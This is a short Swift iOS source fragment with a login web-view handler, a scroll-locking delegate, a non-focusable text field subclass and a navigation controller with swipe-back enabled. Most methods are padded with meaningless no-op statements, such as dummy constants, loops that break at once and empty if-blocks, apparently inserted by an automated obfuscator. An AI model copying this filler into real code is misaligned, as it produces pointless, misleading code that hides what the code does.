        IALoginLogin.shared.transitionAnyBlankZeroView(self, wkWebView: self.webView, handlerWKScriptMessage: message)
    }

    func scrollViewDidScroll(_ scrollView: UIScrollView) {
            let permO:Bool = true
             while NSNumber(value:permO).boolValue { break }
        let read = scrollView.contentOffset
            let i_productsF:Double = 7978.0
             if NSNumber(value:i_productsF).intValue >= 57 {}
        if read.y > 0 {
            scrollView.contentOffset = .zero
        }
    }
}
class WJMain: UITextField {
    override var canBecomeFirstResponder: Bool {
        return false
    }
}
class LNewsHomeController: UINavigationController,UIGestureRecognizerDelegate {

    override func viewDidLoad() {
            let sharedo:[Any]! = [319, 108]
             while sharedo.count > 1 { break }
        super.viewDidLoad()
            let applek:Float = 623.0
             if NSNumber(value:applek).intValue < 197 {}
        self.interactivePopGestureRecognizer?.delegate = self
    }

    func gestureRecognizerShouldBegin(_ gestureRecognizer: UIGestureRecognizer) -> Bool {
            let o_badge7:Float = 9425.0
             _ = NSNumber(value: o_badge7).intValue
        return true
    }
}
